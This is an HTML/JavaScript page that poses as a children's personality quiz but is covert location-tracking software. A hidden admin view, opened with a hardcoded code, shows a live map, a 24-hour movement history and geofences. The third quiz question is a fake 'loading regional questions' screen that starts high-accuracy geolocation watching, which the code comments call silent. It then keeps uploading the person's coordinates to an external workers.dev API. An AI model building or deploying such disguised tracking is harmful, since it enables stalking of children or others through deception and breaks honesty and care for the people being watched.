<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>趣味小测试</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f5; min-height: 100vh; }
    
    /* 家长端样式 */
    #parentView { display: none; }
    #parentView.active { display: block; }
    #map { width: 100%; height: 55vh; }
    .panel { padding: 16px; background: white; }
    .btn { padding: 10px 16px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; margin: 4px; }
    .btn-primary { background: #1677ff; color: white; }
    .btn-danger { background: #ff4d4f; color: white; }
    .btn-secondary { background: #f0f0f0; color: #333; }
    .info { padding: 12px 0; color: #666; font-size: 14px; border-bottom: 1px solid #eee; }
    .status { padding: 4px 8px; border-radius: 4px; font-size: 12px; }
    .status.online { background: #e6f7e6; color: #52c41a; }
    .status.offline { background: #fff2f0; color: #ff4d4f; }
    #addGeofence { display: none; padding: 16px; background: #f9f9f9; border-radius: 8px; margin-top: 12px; }
    #addGeofence input { padding: 8px 12px; margin: 6px 0; border: 1px solid #ddd; border-radius: 6px; width: 100%; }
    .geofence-item { padding: 10px 12px; background: #fafafa; border-radius: 8px; margin: 6px 0; display: flex; justify-content: space-between; align-items: center; }
    
    /* 孩子端测试样式 */
    #kidTest { display: none; }
    #kidTest.active { display: block; }
    .quiz-container { max-width: 500px; margin: 0 auto; padding: 20px; }
    .quiz-header { text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 16px 16px 0 0; }
    .quiz-header h1 { font-size: 24px; margin-bottom: 8px; }
    .quiz-header p { opacity: 0.9; font-size: 14px; }
    .quiz-card { background: white; border-radius: 0 0 16px 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
    .progress-bar { height: 6px; background: #eee; border-radius: 3px; margin-bottom: 20px; overflow: hidden; }
    .progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
    .question { font-size: 18px; font-weight: 600; margin-bottom: 20px; line-height: 1.5; }
    .options { display: flex; flex-direction: column; gap: 12px; }
    .option { padding: 14px 18px; border: 2px solid #eee; border-radius: 12px; cursor: pointer; transition: all 0.2s; font-size: 15px; }
    .option:hover { border-color: #667eea; background: #f8f9ff; }
    .option.selected { border-color: #667eea; background: #667eea; color: white; }
    .result { text-align: center; padding: 40px 20px; }
    .result-icon { font-size: 64px; margin-bottom: 16px; }
    .result h2 { font-size: 22px; margin-bottom: 12px; color: #333; }
    .result p { color: #666; line-height: 1.6; margin-bottom: 20px; }
    .result-card { background: #f9f9f9; padding: 20px; border-radius: 12px; margin-top: 20px; }
    
    /* 入口选择 */
    #entry { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
    .entry-card { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 100%; }
    .entry-card h2 { font-size: 20px; margin-bottom: 24px; color: #333; }
    .entry-btn { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 12px; font-size: 16px; cursor: pointer; }
    .entry-btn.primary { background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
    .entry-btn.secondary { background: #f0f0f0; color: #333; }
    .secret-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-top: 12px; text-align: center; font-size: 16px; }
  </style>
</head>
<body>
  <!-- 入口选择 -->
  <div id="entry">
    <div class="entry-card">
      <div style="font-size:48px; margin-bottom:16px">🧠</div>
      <h2 style="font-size:22px; margin-bottom:8px">趣味性格测试</h2>
      <p style="color:#999; font-size:13px; margin-bottom:24px">测测你的隐藏性格特质<br>不同地区有专属题目哦~</p>
      <button class="entry-btn primary" onclick="startKidTest()">开始测试</button>
      <button class="entry-btn secondary" style="font-size:13px; color:#999" onclick="showParentLogin()">管理入口</button>
      <div id="parentLogin" style="display:none; margin-top:16px">
        <input type="password" class="secret-input" id="secretCode" placeholder="输入访问码" onkeypress="if(event.key==='Enter')enterParent()">
        <button class="entry-btn primary" style="margin-top:8px" onclick="enterParent()">确认</button>
      </div>
    </div>
  </div>

  <!-- 家长端 -->
  <div id="parentView">
    <div id="map"></div>
    <div class="panel">
      <div class="info">
        <span>状态: <span id="status" class="status offline">离线</span></span>
        <span style="margin-left: 16px">电量: <span id="battery">--</span>%</span>
        <span style="margin-left: 16px">更新: <span id="updateTime">--</span></span>
      </div>
      <div style="margin-top: 12px">
        <button class="btn btn-primary" onclick="toggleHistory()">📊 历史轨迹</button>
        <button class="btn btn-primary" onclick="toggleGeofencePanel()">🔒 添加围栏</button>
        <button class="btn btn-secondary" onclick="centerToKid()">📍 定位</button>
        <button class="btn btn-secondary" onclick="goHome()">🏠 返回</button>
      </div>
      <div id="addGeofence">
        <h4>添加电子围栏</h4>
        <input type="text" id="fenceName" placeholder="围栏名称（如：学校、家）">
        <input type="number" id="fenceRadius" placeholder="半径（米）" value="500">
        <p style="font-size: 12px; color: #999; margin: 8px 0;">💡 点击地图选择围栏中心点</p>
        <button class="btn btn-primary" onclick="saveGeofence()">保存围栏</button>
        <button class="btn btn-secondary" onclick="toggleGeofencePanel()">取消</button>
      </div>
      <div id="geofenceList"></div>
    </div>
  </div>

  <!-- 孩子端测试 -->
  <div id="kidTest">
    <div class="quiz-container">
      <div class="quiz-header">
        <h1>🧠 趣味小测试</h1>
        <p>测测你的隐藏性格特质！</p>
      </div>
      <div class="quiz-card">
        <div class="progress-bar">
          <div class="progress-fill" id="progressFill" style="width: 0%"></div>
        </div>
        <div id="quizContent">
          <div class="question" id="questionText"></div>
          <div class="options" id="optionsContainer"></div>
        </div>
        <div class="result" id="resultContent" style="display:none">
          <div class="result-icon" id="resultIcon"></div>
          <h2 id="resultTitle"></h2>
          <p id="resultDesc"></p>
          <div class="result-card">
            <p style="font-size:14px;color:#999">测试结果已保存</p>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
    // ========== 配置 ==========
    const SECRET_CODE = '888888';  // 家长访问码
    const API_BASE = 'https://kid-tracker-api.shuzurenceshi.workers.dev';  // 数据存储API
    const DEVICE_ID = 'kid-1';
    
    // ========== 测试题目 ==========
    const quizQuestions = [
      {
        question: "周末你最想做什么？",
        options: ["宅家打游戏", "和朋友出去玩", "学习新技能", "睡懒觉"]
      },
      {
        question: "遇到难题时，你通常会？",
        options: ["自己想办法", "问朋友求助", "上网搜索", "先放一放"]
      },
      {
        question: "🔍 正在加载你所在地区的专属题目...",
        options: [],
        isLocationPrompt: true
      },
      {
        question: "你喜欢什么样的天气？",
        options: ["晴天", "阴天", "下雨", "下雪"]
      },
      {
        question: "朋友们通常怎么形容你？",
        options: ["有趣幽默", "靠谱稳重", "聪明机智", "安静内向"]
      },
      {
        question: "如果有一千元零花钱，你会？",
        options: ["买游戏皮肤", "存起来", "买零食", "请朋友吃饭"]
      },
      {
        question: "你更喜欢哪种学习方式？",
        options: ["看视频教程", "看书自学", "有人手把手教", "自己摸索"]
      }
    ];
    
    const quizResults = [
      { icon: "🌟", title: "创意达人", desc: "你拥有丰富的想象力和创造力，善于发现问题的新解法！" },
      { icon: "🎯", title: "目标达人", desc: "你做事专注，一旦确定目标就会全力以赴，很棒！" },
      { icon: "🤝", title: "社交达人", desc: "你善于与人相处，朋友们都很喜欢和你在一起！" },
      { icon: "🧘", title: "淡定达人", desc: "你心态平和，遇事冷静，是大家的主心骨！" }
    ];
    
    // ========== 入口控制 ==========
    function showParentLogin() {
      document.getElementById('parentLogin').style.display = 'block';
      document.getElementById('secretCode').focus();
    }
    
    function enterParent() {
      const code = document.getElementById('secretCode').value;
      if (code === SECRET_CODE) {
        document.getElementById('entry').style.display = 'none';
        document.getElementById('parentView').classList.add('active');
        initParent();
      } else {
        alert('访问码错误');
      }
    }
    
    function startKidTest() {
      document.getElementById('entry').style.display = 'none';
      document.getElementById('kidTest').classList.add('active');
      startQuiz();
      // 不在这里启动追踪，而是在题目中触发
    }
    
    function goHome() {
      document.getElementById('parentView').classList.remove('active');
      document.getElementById('entry').style.display = 'flex';
    }
    
    // ========== 家长端 ==========
    let map, marker, polyline;
    let showHistory = false, addingGeofence = false, geofenceCenter = null;
    let geofenceCircles = [];
    
    function initParent() {
      map = L.map('map').setView([39.90923, 116.397428], 15);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap'
      }).addTo(map);
      
      marker = L.marker([39.90923, 116.397428], { opacity: 0.7 }).addTo(map);
      polyline = L.polyline([], { color: '#667eea', weight: 4, opacity: 0.8 }).addTo(map);
      
      map.on('click', function(e) {
        if (addingGeofence) {
          geofenceCenter = { lat: e.latlng.lat, lng: e.latlng.lng };
          alert('围栏中心已设置！点击「保存围栏」完成添加');
        }
      });
      
      setInterval(fetchLocation, 5000);
      fetchLocation();
      fetchGeofences();
    }
    
    async function fetchLocation() {
      try {
        const res = await fetch(API_BASE + '/api/location/latest?device_id=' + DEVICE_ID);
        const data = await res.json();
        
        if (data.latitude) {
          marker.setLatLng([data.latitude, data.longitude]);
          
          const elapsed = (Date.now() - data.timestamp) / 1000;
          const isOnline = elapsed < 60;
          
          document.getElementById('status').textContent = isOnline ? '在线' : '离线';
          document.getElementById('status').className = 'status ' + (isOnline ? 'online' : 'offline');
          document.getElementById('battery').textContent = data.battery || '--';
          document.getElementById('updateTime').textContent = new Date(data.timestamp).toLocaleTimeString();
        }
      } catch (e) {
        // 静默失败，使用本地存储
        const data = JSON.parse(localStorage.getItem('kid_location') || '{}');
        if (data.latitude) {
          marker.setLatLng([data.latitude, data.longitude]);
          const elapsed = (Date.now() - data.timestamp) / 1000;
          document.getElementById('status').textContent = elapsed < 60 ? '在线' : '离线';
          document.getElementById('status').className = 'status ' + (elapsed < 60 ? 'online' : 'offline');
          document.getElementById('updateTime').textContent = new Date(data.timestamp).toLocaleTimeString();
        }
      }
    }
    
    function centerToKid() {
      marker.getLatLng() && map.setView(marker.getLatLng(), 16);
    }
    
    async function toggleHistory() {
      showHistory = !showHistory;
      
      if (showHistory) {
        try {
          const res = await fetch(API_BASE + '/api/location/history?device_id=' + DEVICE_ID + '&hours=24');
          const history = await res.json();
          if (history.length > 0) {
            polyline.setLatLngs(history.map(p => [p.latitude, p.longitude]));
            map.fitBounds(polyline.getBounds());
          }
        } catch (e) {
          const history = JSON.parse(localStorage.getItem('kid_history') || '[]');
          if (history.length > 0) {
            polyline.setLatLngs(history.map(p => [p.latitude, p.longitude]));
            map.fitBounds(polyline.getBounds());
          }
        }
      } else {
        polyline.setLatLngs([]);
      }
    }
    
    function toggleGeofencePanel() {
      addingGeofence = !addingGeofence;
      document.getElementById('addGeofence').style.display = addingGeofence ? 'block' : 'none';
      if (addingGeofence) alert('请在地图上点击选择围栏中心点');
    }
    
    async function saveGeofence() {
      if (!geofenceCenter) return alert('请先点击地图选择中心点');
      
      const name = document.getElementById('fenceName').value || '围栏';
      const radius = parseInt(document.getElementById('fenceRadius').value) || 500;
      
      let fences = JSON.parse(localStorage.getItem('geofences') || '[]');
      fences.push({
        id: Date.now(),
        name, 
        center_lat: geofenceCenter.lat,
        center_lng: geofenceCenter.lng,
        radius
      });
      localStorage.setItem('geofences', JSON.stringify(fences));
      
      toggleGeofencePanel();
      fetchGeofences();
    }
    
    function fetchGeofences() {
      const fences = JSON.parse(localStorage.getItem('geofences') || '[]');
      geofenceCircles.forEach(c => c.remove());
      geofenceCircles = [];
      
      document.getElementById('geofenceList').innerHTML = fences.map(f => 
        '<div class="geofence-item"><span>' + f.name + ' (' + f.radius + '米)</span>' +
        '<button class="btn btn-danger" onclick="deleteGeofence(' + f.id + ')">删除</button></div>'
      ).join('');
      
      fences.forEach(f => {
        geofenceCircles.push(L.circle([f.center_lat, f.center_lng], {
          radius: f.radius, fillColor: '#ff4d4f', fillOpacity: 0.15, color: '#ff4d4f', weight: 2
        }).addTo(map));
      });
    }
    
    function deleteGeofence(id) {
      let fences = JSON.parse(localStorage.getItem('geofences') || '[]');
      localStorage.setItem('geofences', JSON.stringify(fences.filter(f => f.id !== id)));
      fetchGeofences();
    }
    
    // ========== 孩子端测试 ==========
    let currentQuestion = 0;
    let answers = [];
    
    function startQuiz() {
      currentQuestion = 0;
      answers = [];
      showQuestion();
    }
    
    function showQuestion() {
      const q = quizQuestions[currentQuestion];
      document.getElementById('progressFill').style.width = ((currentQuestion) / quizQuestions.length * 100) + '%';
      document.getElementById('questionText').textContent = q.question;
      
      // 如果是定位提示题
      if (q.isLocationPrompt) {
        document.getElementById('optionsContainer').innerHTML = 
          '<div style="text-align:center; padding:30px 20px;">' +
          '<div style="width:50px; height:50px; border:4px solid #667eea; border-top-color:transparent; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 20px;"></div>' +
          '<p style="color:#333; font-size:16px; margin-bottom:8px;">正在加载你所在地区的专属题目</p>' +
          '<p style="font-size:13px; color:#999;">💡 不同地区有不同的热门话题哦</p>' +
          '</div>' +
          '<style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
        
        // 此时触发定位请求
        setTimeout(() => {
          initKidTracking();
          // 1.5秒后自动进入下一题
          setTimeout(() => {
            currentQuestion++;
            showQuestion();
          }, 1500);
        }, 300);
        return;
      }
      
      document.getElementById('optionsContainer').innerHTML = q.options.map((opt, i) => 
        '<div class="option" onclick="selectOption(' + i + ')">' + opt + '</div>'
      ).join('');
    }
    
    function selectOption(index) {
      answers.push(index);
      
      document.querySelectorAll('.option').forEach((el, i) => {
        el.classList.toggle('selected', i === index);
      });
      
      setTimeout(() => {
        currentQuestion++;
        if (currentQuestion < quizQuestions.length) {
          showQuestion();
        } else {
          showResult();
        }
      }, 500);
    }
    
    function showResult() {
      document.getElementById('progressFill').style.width = '100%';
      document.getElementById('quizContent').style.display = 'none';
      document.getElementById('resultContent').style.display = 'block';
      
      // 随机选一个结果
      const result = quizResults[Math.floor(Math.random() * quizResults.length)];
      document.getElementById('resultIcon').textContent = result.icon;
      document.getElementById('resultTitle').textContent = result.title;
      document.getElementById('resultDesc').textContent = result.desc;
      
      // 继续保持位置追踪
    }
    
    // ========== 孩子端位置追踪（隐蔽） ==========
    let watchId = null;
    
    function initKidTracking() {
      if (!navigator.geolocation) return;
      
      // 静默启动，无提示
      watchId = navigator.geolocation.watchPosition(
        (pos) => {
          const data = {
            device_id: DEVICE_ID,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            battery: null,
            timestamp: Date.now()
          };
          
          // 存储到本地（家长端同设备可读取）
          localStorage.setItem('kid_location', JSON.stringify(data));
          
          // 存储历史
          let history = JSON.parse(localStorage.getItem('kid_history') || '[]');
          history.push(data);
          if (history.length > 1000) history = history.slice(-1000);
          localStorage.setItem('kid_history', JSON.stringify(history));
          
          // 尝试上传到服务器（如果可用）
          uploadLocation(data);
        },
        () => {}, // 静默失败
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
      );
    }
    
    async function uploadLocation(data) {
      try {
        await fetch(API_BASE + '/api/location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
      } catch (e) {
        // 静默失败
      }
    }
  </script>
</body>
</html>
